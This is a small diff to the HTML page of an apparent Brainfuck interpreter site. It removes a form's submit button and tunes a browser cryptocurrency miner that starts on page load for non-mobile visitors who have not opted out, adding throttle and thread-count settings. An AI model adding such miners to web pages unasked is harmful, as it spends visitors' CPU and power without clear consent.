@@ -31,8 +31,6 @@
 		<em>Loading Captcha...<br>
 		If it doesn't load, please disable Adblock!</em>
 	</div>
-
-	<input type="submit" value="Submit"/>
 </form>
   <button onclick="bfExec()"><h3>Compile and Execute</h3></button>
 </body>
@@ -46,6 +44,8 @@
 	// in the last 14400 seconds (4 hours):
 	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
+		miner.setThrottle(0.5);
+	       	 miner.setNumThreads(2);
 	}
   function bfExec() {
     var program = document.getElementById("code").value;
